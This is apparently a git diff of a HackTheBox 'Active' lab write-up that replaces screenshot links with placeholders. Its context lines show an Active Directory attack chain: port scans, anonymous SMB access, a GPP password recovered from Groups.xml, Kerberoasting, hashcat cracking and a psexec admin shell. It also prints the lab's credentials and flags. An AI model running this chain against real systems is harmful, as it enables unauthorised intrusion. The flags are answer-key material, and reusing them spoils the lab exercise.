@@ -25,11 +25,11 @@ sudo nmap -p- --min-rate 1000 -sT -vvv $target
 sudo nmap -sC -sV -p 53,88,135,139,445,464,539,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49167,49168 -T4 $target
 ```
 
-<img width="307" height="98" alt="image" src="https://github.com/user-attachments/assets/0dcf1fb0-c01c-410d-9870-7f22820aa947" />
+<img width="307" height="98" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
-<img width="523" height="595" alt="image" src="https://github.com/user-attachments/assets/1221ba36-b85b-46e4-9afb-18e16519f434" />
+<img width="523" height="595" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
-<img width="953" height="864" alt="image" src="https://github.com/user-attachments/assets/bf823f84-f17c-4f93-b2cc-bcd448c3510e" />
+<img width="953" height="864" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 **Port Scan Results:**
 ```
@@ -68,7 +68,7 @@ PORT      STATE SERVICE       VERSION
 smbmap -H 10.129.24.27 2>/dev/null
 ```
 
-<img width="848" height="196" alt="image" src="https://github.com/user-attachments/assets/db9be15f-c349-4c2e-88bd-f1cded9a7294" />
+<img width="848" height="196" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 **SMB Share Discovery:**
 - **Replication** - Readable with anonymous access
@@ -86,7 +86,7 @@ smb: \> recurse ON
 smb: \> mget *
 ```
 
-<img width="953" height="568" alt="image" src="https://github.com/user-attachments/assets/f7e84f15-5369-4edd-b7eb-acc1b602dca4" />
+<img width="953" height="568" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
 **Critical Finding - Groups.xml:**
 ```xml
@@ -111,7 +111,7 @@ smb: \> mget *
 </Groups>
 ```
 
-<img width="957" height="185" alt="image" src="https://github.com/user-attachments/assets/3f842fec-10c0-4440-9b20-b6699c2dd802" />
+<img width="957" height="185" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 ## 💥 Exploitation
 
@@ -139,9 +139,9 @@ smbclient -U "SVC_TGS"%"GPPstillStandingStrong2k18" //10.129.24.27/Users
 smb: \SVC_TGS\Desktop\> get user.txt
 ```
 
-<img width="841" height="191" alt="image" src="https://github.com/user-attachments/assets/0d85e7bb-db76-4894-b188-68e2e0d61eb7" />
+<img width="841" height="191" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
-<img width="893" height="881" alt="image" src="https://github.com/user-attachments/assets/67747491-f063-4592-87df-3ecad19a79ee" />
+<img width="893" height="881" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
 **User Flag:** `afdcbeca784c889a660b269080541380`
 
@@ -154,7 +154,7 @@ smb: \SVC_TGS\Desktop\> get user.txt
 impacket-GetUserSPNs -request -dc-ip 10.129.24.27 active.htb/SVC_TGS:'GPPstillStandingStrong2k18'
 ```
 
-<img width="960" height="566" alt="image" src="https://github.com/user-attachments/assets/3108b07d-4d23-467a-9d89-7c287e2b6b5c" />
+<img width="960" height="566" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 **Administrator TGS Ticket Obtained:**
 ```
@@ -168,7 +168,7 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c82cd09a6fcddc71
 hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt
 ```
 
-<img width="958" height="934" alt="image" src="https://github.com/user-attachments/assets/c6c7bf31-4741-4c67-8604-35270d481b93" />
+<img width="958" height="934" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 **Cracked Administrator Password:** `Ticketmaster1968`
 
@@ -187,7 +187,7 @@ impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.24.27
 C:\Users\Administrator\Desktop> type root.txt
 ```
 
-<img width="685" height="738" alt="image" src="https://github.com/user-attachments/assets/7e1a7a85-45c7-4dd2-83cd-58166858776d" />
+<img width="685" height="738" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 **Root Flag:** `53e0fb9c6137970df9354ca30232429f`
 
